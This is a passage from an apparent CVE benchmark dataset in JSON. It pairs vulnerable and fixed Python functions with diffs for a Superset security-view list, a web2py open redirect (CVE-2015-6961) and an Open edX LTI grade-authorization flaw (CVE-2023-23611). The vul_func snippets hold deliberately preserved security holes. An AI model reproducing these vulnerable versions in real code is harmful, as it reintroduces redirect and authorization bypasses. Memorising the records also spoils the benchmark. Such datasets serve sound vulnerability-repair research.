        "snippet": "    ADMIN_ONLY_VIEW_MENUS = {\n        \"Access Requests\",\n        \"Action Log\",\n        \"Log\",\n        \"List Users\",\n        \"List Roles\",\n        \"ResetPasswordView\",\n        \"RoleModelView\",\n        \"Row Level Security\",\n        \"Row Level Security Filters\",\n        \"RowLevelSecurityFiltersModelView\",\n        \"Security\",\n        \"SQL Lab\",\n        \"User Registrations\",\n        \"User's Statistics\",\n    } | USER_MODEL_VIEWS"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_323_1",
        "commit": "7650c47e72f28559e91524f5d68d50c2060df4c7",
        "file_path": "superset/security/manager.py",
        "start_line": 226,
        "end_line": 247,
        "snippet": "    ADMIN_ONLY_VIEW_MENUS = {\n        \"Access Requests\",\n        \"Action Log\",\n        \"Log\",\n        \"List Users\",\n        \"List Roles\",\n        \"ResetPasswordView\",\n        \"RoleModelView\",\n        \"Row Level Security\",\n        \"Row Level Security Filters\",\n        \"RowLevelSecurityFiltersModelView\",\n        \"Security\",\n        \"SQL Lab\",\n        \"User Registrations\",\n        \"User's Statistics\",\n        # Guarding all AB_ADD_SECURITY_API = True REST APIs\n        \"Role\",\n        \"Permission\",\n        \"PermissionViewMenu\",\n        \"ViewMenu\",\n        \"User\",\n    } | USER_MODEL_VIEWS"
      }
    ],
    "vul_patch": "--- a/superset/security/manager.py\n+++ b/superset/security/manager.py\n@@ -13,4 +13,10 @@\n         \"SQL Lab\",\n         \"User Registrations\",\n         \"User's Statistics\",\n+        # Guarding all AB_ADD_SECURITY_API = True REST APIs\n+        \"Role\",\n+        \"Permission\",\n+        \"PermissionViewMenu\",\n+        \"ViewMenu\",\n+        \"User\",\n     } | USER_MODEL_VIEWS\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-6961",
    "cve_description": "Open redirect vulnerability in gluon/tools.py in Web2py 2.9.11 allows remote attackers to redirect users to arbitrary web sites and conduct phishing attacks via a URL in the _next parameter to user/logout.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/web2py/web2py",
    "patch_url": [
      "https://github.com/web2py/web2py/commit/e31a099cb3456fef471886339653430ae59056b0"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_405_1",
        "commit": "cc7e10d2166976f201f9be056194c566647f1d33",
        "file_path": "gluon/tools.py",
        "start_line": 1540,
        "end_line": 1544,
        "snippet": "    def get_vars_next(self):\n        next = current.request.vars._next\n        if isinstance(next, (list, tuple)):\n            next = next[0]\n        return next"
      },
      {
        "id": "vul_py_405_2",
        "commit": "cc7e10d2166976f201f9be056194c566647f1d33",
        "file_path": "gluon/tools.py",
        "start_line": 2482,
        "end_line": 2807,
        "snippet": "    def login(self,\n              next=DEFAULT,\n              onvalidation=DEFAULT,\n              onaccept=DEFAULT,\n              log=DEFAULT,\n              ):\n        \"\"\"\n        Returns a login form\n        \"\"\"\n\n        table_user = self.table_user()\n        settings = self.settings\n        if 'username' in table_user.fields or \\\n                not settings.login_email_validate:\n            tmpvalidator = IS_NOT_EMPTY(error_message=self.messages.is_empty)\n            if not settings.username_case_sensitive:\n                tmpvalidator = [IS_LOWER(), tmpvalidator]\n        else:\n            tmpvalidator = IS_EMAIL(error_message=self.messages.invalid_email)\n            if not settings.email_case_sensitive:\n                tmpvalidator = [IS_LOWER(), tmpvalidator]\n\n        request = current.request\n        response = current.response\n        session = current.session\n\n        passfield = settings.password_field\n        try:\n            table_user[passfield].requires[-1].min_length = 0\n        except:\n            pass\n\n        ### use session for federated login\n        snext = self.get_vars_next()\n        if snext and self.settings.prevent_open_redirect_attacks:\n            items = snext.split('/')\n            if '//' in snext and items[2] != request.env.http_host:\n                snext = None\n\n        if snext:\n            session._auth_next = snext\n        elif session._auth_next:\n            snext = session._auth_next\n        ### pass\n\n        if next is DEFAULT:\n            # important for security\n            next = settings.login_next\n            if callable(next):\n                next = next()\n            user_next = snext\n            if user_next:\n                external = user_next.split('://')\n                if external[0].lower() in ['http', 'https', 'ftp']:\n                    host_next = user_next.split('//', 1)[-1].split('/')[0]\n                    if host_next in settings.cas_domains:\n                        next = user_next\n                else:\n                    next = user_next\n        if onvalidation is DEFAULT:\n            onvalidation = settings.login_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = settings.login_onaccept\n        if log is DEFAULT:\n            log = self.messages['login_log']\n\n        onfail = settings.login_onfail\n\n        user = None  # default\n\n\n        #Setup the default field used for the form\n        multi_login = False\n        if self.settings.login_userfield:\n            username = self.settings.login_userfield\n        else:\n            if 'username' in table_user.fields:\n                username = 'username'\n            else:\n                username = 'email'\n            if self.settings.multi_login:\n                multi_login = True\n        old_requires = table_user[username].requires\n        table_user[username].requires = tmpvalidator\n\n        # If two-factor authentication is enabled, and the maximum\n        # number of tries allowed is used up, reset the session to\n        # pre-login state with two-factor auth\n        if session.auth_two_factor_enabled and session.auth_two_factor_tries_left < 1:\n            # Exceeded maximum allowed tries for this code. Require user to enter\n            # username and password again.\n            user = None\n            accepted_form = False\n            self._reset_two_factor_auth(session)\n            # Redirect to the default 'next' page without logging\n            # in. If that page requires login, user will be redirected\n            # back to the main login form\n            redirect(next, client_side=settings.client_side)\n\n        # Before showing the default login form, check whether\n        # we are already on the second step of two-step authentication.\n        # If we are, then skip this login form and use the form for the\n        # second challenge instead.\n        # Note to devs: The code inside the if-block is unchanged from the\n        # previous version of this file, other than for indentation inside\n        # to put it inside the if-block\n        if session.auth_two_factor_user is None:\n\n            if settings.remember_me_form:\n                extra_fields = [\n                    Field('remember_me', 'boolean', default=False,\n                          label = self.messages.label_remember_me)]\n            else:\n                extra_fields = []\n\n            # do we use our own login form, or from a central source?\n            if settings.login_form == self:\n                form = SQLFORM(\n                    table_user,\n                    fields=[username, passfield],\n                    hidden=dict(_next=next),\n                    showid=settings.showid,\n                    submit_button=self.messages.login_button,\n                    delete_label=self.messages.delete_label,\n                    formstyle=settings.formstyle,\n                    separator=settings.label_separator,\n                    extra_fields = extra_fields,\n                )\n\n\n                captcha = settings.login_captcha or \\\n                    (settings.login_captcha != False and settings.captcha)\n                if captcha:\n                    addrow(form, captcha.label, captcha, captcha.comment,\n                           settings.formstyle, 'captcha__row')\n                accepted_form = False\n\n                if form.accepts(request, session if self.csrf_prevention else None,\n                                formname='login', dbio=False,\n                                onvalidation=onvalidation,\n                                hideerror=settings.hideerror):\n\n                    accepted_form = True\n                    # check for username in db\n                    entered_username = form.vars[username]\n                    if multi_login and '@' in entered_username:\n                        # if '@' in username check for email, not username\n                        user = table_user(email = entered_username)\n                    else:\n                        user = table_user(**{username: entered_username})\n                    if user:\n                        # user in db, check if registration pending or disabled\n                        temp_user = user\n                        if temp_user.registration_key == 'pending':\n                            response.flash = self.messages.registration_pending\n                            return form\n                        elif temp_user.registration_key in ('disabled', 'blocked'):\n                            response.flash = self.messages.login_disabled\n                            return form\n                        elif (not temp_user.registration_key is None\n                              and temp_user.registration_key.strip()):\n                            response.flash = \\\n                                self.messages.registration_verifying\n                            return form\n                        # try alternate logins 1st as these have the\n                        # current version of the password\n                        user = None\n                        for login_method in settings.login_methods:\n                            if login_method != self and \\\n                                    login_method(request.vars[username],\n                                                 request.vars[passfield]):\n                                if not self in settings.login_methods:\n                                    # do not store password in db\n                                    form.vars[passfield] = None\n                                user = self.get_or_create_user(\n                                    form.vars, settings.update_fields)\n                                break\n                        if not user:\n                            # alternates have failed, maybe because service inaccessible\n                            if settings.login_methods[0] == self:\n                                # try logging in locally using cached credentials\n                                if form.vars.get(passfield, '') == temp_user[passfield]:\n                                    # success\n                                    user = temp_user\n                    else:\n                        # user not in db\n                        if not settings.alternate_requires_registration:\n                            # we're allowed to auto-register users from external systems\n                            for login_method in settings.login_methods:\n                                if login_method != self and \\\n                                        login_method(request.vars[username],\n                                                     request.vars[passfield]):\n                                    if not self in settings.login_methods:\n                                        # do not store password in db\n                                        form.vars[passfield] = None\n                                    user = self.get_or_create_user(\n                                        form.vars, settings.update_fields)\n                                    break\n                    if not user:\n                        self.log_event(self.messages['login_failed_log'],\n                                       request.post_vars)\n                        # invalid login\n                        session.flash = self.messages.invalid_login\n                        callback(onfail, None)\n                        redirect(\n                            self.url(args=request.args, vars=request.get_vars),\n                            client_side=settings.client_side)\n\n            else: # use a central authentication server\n                cas = settings.login_form\n                cas_user = cas.get_user()\n\n                if cas_user:\n                    cas_user[passfield] = None\n                    user = self.get_or_create_user(\n                        table_user._filter_fields(cas_user),\n                        settings.update_fields)\n                elif hasattr(cas, 'login_form'):\n                    return cas.login_form()\n                else:\n                    # we need to pass through login again before going on\n                    next = self.url(settings.function, args='login')\n                    redirect(cas.login_url(next),\n                             client_side=settings.client_side)\n\n        # Extra login logic for two-factor authentication\n        #################################################\n        # If the 'user' variable has a value, this means that the first\n        # authentication step was successful (i.e. user provided correct\n        # username and password at the first challenge).\n        # Check if this user is signed up for two-factor authentication\n        # Default rule is that the user must be part of a group that is called\n        # auth.settings.two_factor_authentication_group\n        if user and self.settings.two_factor_authentication_group:\n            role = self.settings.two_factor_authentication_group\n            session.auth_two_factor_enabled = self.has_membership(user_id=user.id, role=role)\n        # challenge\n        if session.auth_two_factor_enabled:\n            form = SQLFORM.factory(\n                Field('authentication_code',\n                      required=True,\n                      comment='This code was emailed to you and is required for login.'),\n                hidden=dict(_next=next),\n                formstyle=settings.formstyle,\n                separator=settings.label_separator\n            )\n            # accepted_form is used by some default web2py code later in the\n            # function that handles running specified functions before redirect\n            # Set it to False until the challenge form is accepted.\n            accepted_form = False\n            # Handle the case when a user has submitted the login/password\n            # form successfully, and the password has been validated, but\n            # the two-factor form has not been displayed or validated yet.\n            if session.auth_two_factor_user is None and user is not None:\n                session.auth_two_factor_user = user # store the validated user and associate with this session\n                session.auth_two_factor = random.randint(100000, 999999)\n                session.auth_two_factor_tries_left = 3 # Allow user to try up to 4 times\n                # TODO: Add some error checking to handle cases where email cannot be sent\n                self.settings.mailer.send(\n                    to=user.email,\n                    subject=\"Two-step Login Authentication Code\",\n                    message=\"Your temporary login code is {0}\".format(session.auth_two_factor))\n            if form.accepts(request, session if self.csrf_prevention else None,\n                            formname='login', dbio=False,\n                            onvalidation=onvalidation,\n                            hideerror=settings.hideerror):\n                accepted_form = True\n                if form.vars['authentication_code'] == str(session.auth_two_factor):\n                    # Handle the case when the two-factor form has been successfully validated\n                    # and the user was previously stored (the current user should be None because\n                    # in this case, the previous username/password login form should not be displayed.\n                    # This will allow the code after the 2-factor authentication block to proceed as\n                    # normal.\n                    if user is None or user == session.auth_two_factor_user:\n                        user = session.auth_two_factor_user\n                    # For security, because the username stored in the\n                    # session somehow does not match the just validated\n                    # user. Should not be possible without session stealing\n                    # which is hard with SSL.\n                    elif user != session.auth_two_factor_user:\n                        user = None\n                    # Either way, the user and code associated with this session should\n                    # be removed. This handles cases where the session login may have\n                    # expired but browser window is open, so the old session key and\n                    # session usernamem will still exist\n                    self._reset_two_factor_auth(session)\n                else:\n                    # TODO: Limit the number of retries allowed.\n                    response.flash = 'Incorrect code. {0} more attempt(s) remaining.'.format(session.auth_two_factor_tries_left)\n                    session.auth_two_factor_tries_left -= 1\n                    return form\n            else:\n                return form\n        # End login logic for two-factor authentication\n\n        # process authenticated users\n        if user:\n            user = Row(table_user._filter_fields(user, id=True))\n            # process authenticated users\n            # user wants to be logged in for longer\n            self.login_user(user)\n            session.auth.expiration = \\\n                request.post_vars.remember_me and \\\n                settings.long_expiration or \\\n                settings.expiration\n            session.auth.remember_me = 'remember_me' in request.post_vars\n            self.log_event(log, user)\n            session.flash = self.messages.logged_in\n\n        # how to continue\n        if settings.login_form == self:\n            if accepted_form:\n                callback(onaccept, form)\n                if next == session._auth_next:\n                    session._auth_next = None\n                next = replace_id(next, form)\n                redirect(next, client_side=settings.client_side)\n\n            table_user[username].requires = old_requires\n            return form\n        elif user:\n            callback(onaccept, None)\n\n        if next == session._auth_next:\n            del session._auth_next\n        redirect(next, client_side=settings.client_side)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_405_1",
        "commit": "e31a099cb3456fef471886339653430ae59056b0",
        "file_path": "gluon/tools.py",
        "start_line": 1540,
        "end_line": 1550,
        "snippet": "    def get_vars_next(self):\n        next = current.request.vars._next\n        if isinstance(next, (list, tuple)):\n            next = next[0]\n        if next and self.settings.prevent_open_redirect_attacks:\n            # Prevent an attacker from adding an arbitrary url after the\n            # _next variable in the request.\n            items = next.split('/')\n            if '//' in next and items[2] != current.request.env.http_host:\n                next = None            \n        return next"
      },
      {
        "id": "fix_py_405_2",
        "commit": "e31a099cb3456fef471886339653430ae59056b0",
        "file_path": "gluon/tools.py",
        "start_line": 2488,
        "end_line": 2809,
        "snippet": "    def login(self,\n              next=DEFAULT,\n              onvalidation=DEFAULT,\n              onaccept=DEFAULT,\n              log=DEFAULT,\n              ):\n        \"\"\"\n        Returns a login form\n        \"\"\"\n\n        table_user = self.table_user()\n        settings = self.settings\n        if 'username' in table_user.fields or \\\n                not settings.login_email_validate:\n            tmpvalidator = IS_NOT_EMPTY(error_message=self.messages.is_empty)\n            if not settings.username_case_sensitive:\n                tmpvalidator = [IS_LOWER(), tmpvalidator]\n        else:\n            tmpvalidator = IS_EMAIL(error_message=self.messages.invalid_email)\n            if not settings.email_case_sensitive:\n                tmpvalidator = [IS_LOWER(), tmpvalidator]\n\n        request = current.request\n        response = current.response\n        session = current.session\n\n        passfield = settings.password_field\n        try:\n            table_user[passfield].requires[-1].min_length = 0\n        except:\n            pass\n\n        ### use session for federated login\n        snext = self.get_vars_next()\n\n        if snext:\n            session._auth_next = snext\n        elif session._auth_next:\n            snext = session._auth_next\n        ### pass\n\n        if next is DEFAULT:\n            # important for security\n            next = settings.login_next\n            if callable(next):\n                next = next()\n            user_next = snext\n            if user_next:\n                external = user_next.split('://')\n                if external[0].lower() in ['http', 'https', 'ftp']:\n                    host_next = user_next.split('//', 1)[-1].split('/')[0]\n                    if host_next in settings.cas_domains:\n                        next = user_next\n                else:\n                    next = user_next\n        if onvalidation is DEFAULT:\n            onvalidation = settings.login_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = settings.login_onaccept\n        if log is DEFAULT:\n            log = self.messages['login_log']\n\n        onfail = settings.login_onfail\n\n        user = None  # default\n\n\n        #Setup the default field used for the form\n        multi_login = False\n        if self.settings.login_userfield:\n            username = self.settings.login_userfield\n        else:\n            if 'username' in table_user.fields:\n                username = 'username'\n            else:\n                username = 'email'\n            if self.settings.multi_login:\n                multi_login = True\n        old_requires = table_user[username].requires\n        table_user[username].requires = tmpvalidator\n\n        # If two-factor authentication is enabled, and the maximum\n        # number of tries allowed is used up, reset the session to\n        # pre-login state with two-factor auth\n        if session.auth_two_factor_enabled and session.auth_two_factor_tries_left < 1:\n            # Exceeded maximum allowed tries for this code. Require user to enter\n            # username and password again.\n            user = None\n            accepted_form = False\n            self._reset_two_factor_auth(session)\n            # Redirect to the default 'next' page without logging\n            # in. If that page requires login, user will be redirected\n            # back to the main login form\n            redirect(next, client_side=settings.client_side)\n\n        # Before showing the default login form, check whether\n        # we are already on the second step of two-step authentication.\n        # If we are, then skip this login form and use the form for the\n        # second challenge instead.\n        # Note to devs: The code inside the if-block is unchanged from the\n        # previous version of this file, other than for indentation inside\n        # to put it inside the if-block\n        if session.auth_two_factor_user is None:\n\n            if settings.remember_me_form:\n                extra_fields = [\n                    Field('remember_me', 'boolean', default=False,\n                          label = self.messages.label_remember_me)]\n            else:\n                extra_fields = []\n\n            # do we use our own login form, or from a central source?\n            if settings.login_form == self:\n                form = SQLFORM(\n                    table_user,\n                    fields=[username, passfield],\n                    hidden=dict(_next=next),\n                    showid=settings.showid,\n                    submit_button=self.messages.login_button,\n                    delete_label=self.messages.delete_label,\n                    formstyle=settings.formstyle,\n                    separator=settings.label_separator,\n                    extra_fields = extra_fields,\n                )\n\n\n                captcha = settings.login_captcha or \\\n                    (settings.login_captcha != False and settings.captcha)\n                if captcha:\n                    addrow(form, captcha.label, captcha, captcha.comment,\n                           settings.formstyle, 'captcha__row')\n                accepted_form = False\n\n                if form.accepts(request, session if self.csrf_prevention else None,\n                                formname='login', dbio=False,\n                                onvalidation=onvalidation,\n                                hideerror=settings.hideerror):\n\n                    accepted_form = True\n                    # check for username in db\n                    entered_username = form.vars[username]\n                    if multi_login and '@' in entered_username:\n                        # if '@' in username check for email, not username\n                        user = table_user(email = entered_username)\n                    else:\n                        user = table_user(**{username: entered_username})\n                    if user:\n                        # user in db, check if registration pending or disabled\n                        temp_user = user\n                        if temp_user.registration_key == 'pending':\n                            response.flash = self.messages.registration_pending\n                            return form\n                        elif temp_user.registration_key in ('disabled', 'blocked'):\n                            response.flash = self.messages.login_disabled\n                            return form\n                        elif (not temp_user.registration_key is None\n                              and temp_user.registration_key.strip()):\n                            response.flash = \\\n                                self.messages.registration_verifying\n                            return form\n                        # try alternate logins 1st as these have the\n                        # current version of the password\n                        user = None\n                        for login_method in settings.login_methods:\n                            if login_method != self and \\\n                                    login_method(request.vars[username],\n                                                 request.vars[passfield]):\n                                if not self in settings.login_methods:\n                                    # do not store password in db\n                                    form.vars[passfield] = None\n                                user = self.get_or_create_user(\n                                    form.vars, settings.update_fields)\n                                break\n                        if not user:\n                            # alternates have failed, maybe because service inaccessible\n                            if settings.login_methods[0] == self:\n                                # try logging in locally using cached credentials\n                                if form.vars.get(passfield, '') == temp_user[passfield]:\n                                    # success\n                                    user = temp_user\n                    else:\n                        # user not in db\n                        if not settings.alternate_requires_registration:\n                            # we're allowed to auto-register users from external systems\n                            for login_method in settings.login_methods:\n                                if login_method != self and \\\n                                        login_method(request.vars[username],\n                                                     request.vars[passfield]):\n                                    if not self in settings.login_methods:\n                                        # do not store password in db\n                                        form.vars[passfield] = None\n                                    user = self.get_or_create_user(\n                                        form.vars, settings.update_fields)\n                                    break\n                    if not user:\n                        self.log_event(self.messages['login_failed_log'],\n                                       request.post_vars)\n                        # invalid login\n                        session.flash = self.messages.invalid_login\n                        callback(onfail, None)\n                        redirect(\n                            self.url(args=request.args, vars=request.get_vars),\n                            client_side=settings.client_side)\n\n            else: # use a central authentication server\n                cas = settings.login_form\n                cas_user = cas.get_user()\n\n                if cas_user:\n                    cas_user[passfield] = None\n                    user = self.get_or_create_user(\n                        table_user._filter_fields(cas_user),\n                        settings.update_fields)\n                elif hasattr(cas, 'login_form'):\n                    return cas.login_form()\n                else:\n                    # we need to pass through login again before going on\n                    next = self.url(settings.function, args='login')\n                    redirect(cas.login_url(next),\n                             client_side=settings.client_side)\n\n        # Extra login logic for two-factor authentication\n        #################################################\n        # If the 'user' variable has a value, this means that the first\n        # authentication step was successful (i.e. user provided correct\n        # username and password at the first challenge).\n        # Check if this user is signed up for two-factor authentication\n        # Default rule is that the user must be part of a group that is called\n        # auth.settings.two_factor_authentication_group\n        if user and self.settings.two_factor_authentication_group:\n            role = self.settings.two_factor_authentication_group\n            session.auth_two_factor_enabled = self.has_membership(user_id=user.id, role=role)\n        # challenge\n        if session.auth_two_factor_enabled:\n            form = SQLFORM.factory(\n                Field('authentication_code',\n                      required=True,\n                      comment='This code was emailed to you and is required for login.'),\n                hidden=dict(_next=next),\n                formstyle=settings.formstyle,\n                separator=settings.label_separator\n            )\n            # accepted_form is used by some default web2py code later in the\n            # function that handles running specified functions before redirect\n            # Set it to False until the challenge form is accepted.\n            accepted_form = False\n            # Handle the case when a user has submitted the login/password\n            # form successfully, and the password has been validated, but\n            # the two-factor form has not been displayed or validated yet.\n            if session.auth_two_factor_user is None and user is not None:\n                session.auth_two_factor_user = user # store the validated user and associate with this session\n                session.auth_two_factor = random.randint(100000, 999999)\n                session.auth_two_factor_tries_left = 3 # Allow user to try up to 4 times\n                # TODO: Add some error checking to handle cases where email cannot be sent\n                self.settings.mailer.send(\n                    to=user.email,\n                    subject=\"Two-step Login Authentication Code\",\n                    message=\"Your temporary login code is {0}\".format(session.auth_two_factor))\n            if form.accepts(request, session if self.csrf_prevention else None,\n                            formname='login', dbio=False,\n                            onvalidation=onvalidation,\n                            hideerror=settings.hideerror):\n                accepted_form = True\n                if form.vars['authentication_code'] == str(session.auth_two_factor):\n                    # Handle the case when the two-factor form has been successfully validated\n                    # and the user was previously stored (the current user should be None because\n                    # in this case, the previous username/password login form should not be displayed.\n                    # This will allow the code after the 2-factor authentication block to proceed as\n                    # normal.\n                    if user is None or user == session.auth_two_factor_user:\n                        user = session.auth_two_factor_user\n                    # For security, because the username stored in the\n                    # session somehow does not match the just validated\n                    # user. Should not be possible without session stealing\n                    # which is hard with SSL.\n                    elif user != session.auth_two_factor_user:\n                        user = None\n                    # Either way, the user and code associated with this session should\n                    # be removed. This handles cases where the session login may have\n                    # expired but browser window is open, so the old session key and\n                    # session usernamem will still exist\n                    self._reset_two_factor_auth(session)\n                else:\n                    # TODO: Limit the number of retries allowed.\n                    response.flash = 'Incorrect code. {0} more attempt(s) remaining.'.format(session.auth_two_factor_tries_left)\n                    session.auth_two_factor_tries_left -= 1\n                    return form\n            else:\n                return form\n        # End login logic for two-factor authentication\n\n        # process authenticated users\n        if user:\n            user = Row(table_user._filter_fields(user, id=True))\n            # process authenticated users\n            # user wants to be logged in for longer\n            self.login_user(user)\n            session.auth.expiration = \\\n                request.post_vars.remember_me and \\\n                settings.long_expiration or \\\n                settings.expiration\n            session.auth.remember_me = 'remember_me' in request.post_vars\n            self.log_event(log, user)\n            session.flash = self.messages.logged_in\n\n        # how to continue\n        if settings.login_form == self:\n            if accepted_form:\n                callback(onaccept, form)\n                if next == session._auth_next:\n                    session._auth_next = None\n                next = replace_id(next, form)\n                redirect(next, client_side=settings.client_side)\n\n            table_user[username].requires = old_requires\n            return form\n        elif user:\n            callback(onaccept, None)\n\n        if next == session._auth_next:\n            del session._auth_next\n        redirect(next, client_side=settings.client_side)"
      }
    ],
    "vul_patch": "--- a/gluon/tools.py\n+++ b/gluon/tools.py\n@@ -2,4 +2,10 @@\n         next = current.request.vars._next\n         if isinstance(next, (list, tuple)):\n             next = next[0]\n+        if next and self.settings.prevent_open_redirect_attacks:\n+            # Prevent an attacker from adding an arbitrary url after the\n+            # _next variable in the request.\n+            items = next.split('/')\n+            if '//' in next and items[2] != current.request.env.http_host:\n+                next = None            \n         return next\n\n--- a/gluon/tools.py\n+++ b/gluon/tools.py\n@@ -32,10 +32,6 @@\n \n         ### use session for federated login\n         snext = self.get_vars_next()\n-        if snext and self.settings.prevent_open_redirect_attacks:\n-            items = snext.split('/')\n-            if '//' in snext and items[2] != request.env.http_host:\n-                snext = None\n \n         if snext:\n             session._auth_next = snext\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-23611",
    "cve_description": "LTI Consumer XBlock implements the consumer side of the LTI specification enabling integration of third-party LTI provider tools. Versions 7.0.0 and above, prior to 7.2.2, are vulnerable to Missing Authorization.  Any LTI tool that is integrated with on the Open edX platform can post a grade back for any LTI XBlock so long as it knows or can guess the block location for that XBlock. An LTI tool submits scores to the edX platform for line items. The code that uploads that score to the LMS grade tables determines which XBlock to upload the grades for by reading the resource_link_id field of the associated line item. The LTI tool may submit any value for the resource_link_id field, allowing a malicious LTI tool to submit scores for any LTI XBlock on the platform. The impact is a loss of integrity for LTI XBlock grades. This issue is patched in 7.2.2. No workarounds exist.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-639": {
        "name": "Authorization Bypass Through User-Controlled Key",
        "description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
      }
    },
    "repo": "https://github.com/openedx/xblock-lti-consumer",
    "patch_url": [
      "https://github.com/openedx/xblock-lti-consumer/commit/252f94bd182cd0962af9251015930cb55ec515d7"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_126_1",
        "commit": "8da48aa",
        "file_path": "lti_consumer/signals/signals.py",
        "start_line": 17,
        "end_line": 64,
        "snippet": "def publish_grade_on_score_update(sender, instance, **kwargs):  # pylint: disable=unused-argument\n    \"\"\"\n    Publish grade to xblock whenever score saved/updated and its grading_progress is set to FullyGraded.\n\n    This method DOES NOT WORK on Studio, since it relies on APIs only available and configured\n    in the LMS. Trying to trigger this signal from Studio (from the Django-admin interface, for example)\n    throw an exception.\n    \"\"\"\n    # Before starting to publish grades to the LMS, check that:\n    # 1. The grade being submitted in the final one - `FullyGraded`\n    # 2. This LineItem is linked to a LMS grade - the `LtiResouceLinkId` field is set\n    # 3. There's a valid grade in this score - `scoreGiven` is set\n    if instance.grading_progress == LtiAgsScore.FULLY_GRADED \\\n            and instance.line_item.resource_link_id \\\n            and instance.score_given:\n        try:\n            # Load block using LMS APIs and check if the block is graded and still accept grades.\n            block = compat.load_block_as_user(instance.line_item.resource_link_id)\n            if block.has_score and (not block.is_past_due() or block.accept_grades_past_due):\n                # Map external ID to platform user\n                user = compat.get_user_from_external_user_id(instance.user_id)\n\n                # The LTI AGS spec allow tools to send grades higher than score maximum, so\n                # we have to cap the score sent to the gradebook to the maximum allowed value.\n                # Also, this is an normalized score ranging from 0 to 1.\n                score = min(instance.score_given, instance.score_maximum) / instance.score_maximum\n\n                # Set module score using XBlock custom method to do so.\n                # This saves the score on both the XBlock's K/V store as well as in\n                # the LMS database.\n                log.info(\n                    \"Publishing LTI grade from block %s to LMS. User: %s (score: %s)\",\n                    block.scope_ids.usage_id,\n                    user,\n                    score,\n                )\n                block.set_user_module_score(user, score, block.max_score(), instance.comment)\n\n        # This is a catch all exception to catch and log any issues related to loading the block\n        # from the modulestore and other LMS API calls\n        except Exception as exc:\n            log.exception(\n                \"Error while publishing score %r to block %s to LMS: %s\",\n                instance,\n                instance.line_item.resource_link_id,\n                exc,\n            )\n            raise exc"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_126_1",
        "commit": "252f94b",
        "file_path": "lti_consumer/signals/signals.py",
        "start_line": 17,
        "end_line": 82,
        "snippet": "def publish_grade_on_score_update(sender, instance, **kwargs):  # pylint: disable=unused-argument\n    \"\"\"\n    Publish grade to xblock whenever score saved/updated and its grading_progress is set to FullyGraded.\n\n    This method DOES NOT WORK on Studio, since it relies on APIs only available and configured\n    in the LMS. Trying to trigger this signal from Studio (from the Django-admin interface, for example)\n    throw an exception.\n    \"\"\"\n    line_item = instance.line_item\n    lti_config = line_item.lti_configuration\n\n    # Only save score if the `line_item.resource_link_id` is the same as\n    # `lti_configuration.location` to prevent LTI tools to alter grades they don't\n    # have permissions to.\n    # TODO: This security mechanism will need to be reworked once we enable LTI 1.3\n    # reusability to allow one configuration to save scores on multiple placements,\n    # but still locking down access to the items that are using the LTI configurtion.\n    if line_item.resource_link_id != lti_config.location:\n        log.warning(\n            \"LTI tool tried publishing score %r to block %s (outside allowed scope of: %s).\",\n            instance,\n            line_item.resource_link_id,\n            lti_config.location,\n        )\n        return\n\n    # Before starting to publish grades to the LMS, check that:\n    # 1. The grade being submitted in the final one - `FullyGraded`\n    # 2. This LineItem is linked to a LMS grade - the `LtiResouceLinkId` field is set\n    # 3. There's a valid grade in this score - `scoreGiven` is set\n    if instance.grading_progress == LtiAgsScore.FULLY_GRADED \\\n            and line_item.resource_link_id \\\n            and instance.score_given:\n        try:\n            # Load block using LMS APIs and check if the block is graded and still accept grades.\n            block = compat.load_block_as_user(line_item.resource_link_id)\n            if block.has_score and (not block.is_past_due() or block.accept_grades_past_due):\n                # Map external ID to platform user\n                user = compat.get_user_from_external_user_id(instance.user_id)\n\n                # The LTI AGS spec allow tools to send grades higher than score maximum, so\n                # we have to cap the score sent to the gradebook to the maximum allowed value.\n                # Also, this is an normalized score ranging from 0 to 1.\n                score = min(instance.score_given, instance.score_maximum) / instance.score_maximum\n\n                # Set module score using XBlock custom method to do so.\n                # This saves the score on both the XBlock's K/V store as well as in\n                # the LMS database.\n                log.info(\n                    \"Publishing LTI grade from block %s to LMS. User: %s (score: %s)\",\n                    block.scope_ids.usage_id,\n                    user,\n                    score,\n                )\n                block.set_user_module_score(user, score, block.max_score(), instance.comment)\n\n        # This is a catch all exception to catch and log any issues related to loading the block\n        # from the modulestore and other LMS API calls\n        except Exception as exc:\n            log.exception(\n                \"Error while publishing score %r to block %s to LMS: %s\",\n                instance,\n                line_item.resource_link_id,\n                exc,\n            )\n            raise exc"
      }
    ],
    "vul_patch": "--- a/lti_consumer/signals/signals.py\n+++ b/lti_consumer/signals/signals.py\n@@ -6,16 +6,34 @@\n     in the LMS. Trying to trigger this signal from Studio (from the Django-admin interface, for example)\n     throw an exception.\n     \"\"\"\n+    line_item = instance.line_item\n+    lti_config = line_item.lti_configuration\n+\n+    # Only save score if the `line_item.resource_link_id` is the same as\n+    # `lti_configuration.location` to prevent LTI tools to alter grades they don't\n+    # have permissions to.\n+    # TODO: This security mechanism will need to be reworked once we enable LTI 1.3\n+    # reusability to allow one configuration to save scores on multiple placements,\n+    # but still locking down access to the items that are using the LTI configurtion.\n+    if line_item.resource_link_id != lti_config.location:\n+        log.warning(\n+            \"LTI tool tried publishing score %r to block %s (outside allowed scope of: %s).\",\n+            instance,\n+            line_item.resource_link_id,\n+            lti_config.location,\n+        )\n+        return\n+\n     # Before starting to publish grades to the LMS, check that:\n     # 1. The grade being submitted in the final one - `FullyGraded`\n     # 2. This LineItem is linked to a LMS grade - the `LtiResouceLinkId` field is set\n     # 3. There's a valid grade in this score - `scoreGiven` is set\n     if instance.grading_progress == LtiAgsScore.FULLY_GRADED \\\n-            and instance.line_item.resource_link_id \\\n+            and line_item.resource_link_id \\\n             and instance.score_given:\n         try:\n             # 